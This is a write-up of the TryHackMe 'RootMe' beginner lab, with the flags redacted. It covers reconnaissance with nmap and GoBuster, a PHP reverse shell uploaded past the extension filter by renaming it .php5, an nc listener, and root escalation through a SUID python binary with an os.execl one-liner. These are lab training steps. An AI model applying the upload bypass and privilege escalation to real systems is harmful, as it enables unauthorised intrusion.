# RootMe — Write-up

A CTF for beginners, can you root me?

**Difficulty:** Easy 🟢  
**Platform:** TryHackMe  
**Level:** Easy  
**Category:** Web  

> Link: https://tryhackme.com/room/rrootme


---

## Task 1: Deploy the machine
No answer needed.

---

## Task 2: Reconnaissance

### Port scan (all ports)

Scan the machine, how many ports are open?

```bash
nmap <target_ip> -p- -T4
```

**Output (redacted):**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Answer:** 2

### Service/version detection

What version of Apache is running?  
What service is running on port 22?

```bash
nmap -sV <target_ip> -p 22,80 -T4
```

**Output (redacted):**
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

**Answer(s):**
- Apache: **2.4.41**
- Port 22 service: **OpenSSH**

### Directory discovery (GoBuster)

Find directories on the web server using the GoBuster tool. No answer needed.

```bash
gobuster dir -u <target_ip> -w /usr/share/wordlists/dirb/common.txt
```

What is the hidden directory?

**Output (redacted):**
```bash
/css        (Status: 301)
/js         (Status: 301)
/[redacted] (Status: 301)
/uploads    (Status: 301)
```

**Answer:** `/<redacted>/`

---

## Task 3: Getting a shell

### Upload form discovery

The application provides a public file upload form. Initial analysis suggests a potential vulnerability due to insufficient extension filtering.

URL:
- `http://<target_ip>/<redacted>/`

<img src="./images/paginaentrada.png" width="1200">

### Reverse shell setup

Payload selection: **pentestmonkey PHP reverse shell**, configured with attacker IP and port.

Listener:

```bash
nc -lvnp 4444
```

### Restriction: `.php` blocked

Attempting to upload a `.php` file is rejected by the server-side filter:

<img src="./images/phptentativa.png" width="1200">

### Bypass: `.php` → `.php5`

Renaming the payload to `.php5` bypassed the filter (legacy extension handling).

<img src="./images/php5tentativa.png" width="1200">

### Triggering the payload

The `/uploads` directory was identified earlier via GoBuster. After upload, the payload was executed from that directory:

<img src="./images/rodandooshell.png" width="1200">

### Reverse shell obtained

```bash
nc -lvnp 4444
```

**Output (redacted):**
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### Stabilizing the session + user flag

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
```

**Flag:**
- `THM{redacted}`

---

## Task 4: Privilege escalation

### SUID enumeration

Search for files with SUID permission; identify the “weird” one.

```bash
find / -perm -4000 2>/dev/null
```

**Key finding (unusual SUID binary):**
- `/usr/bin/python2.7`

A SUID Python interpreter is highly dangerous because it enables privilege-preserving shell execution.

### Escalation via SUID python

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Validate privileges:

```bash
id
```

**Output (redacted):**
```bash
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

### Root flag

```bash
cat /root/root.txt
```

**Flag:**
- `THM{redacted}`

---

Written by Nelson Hirt
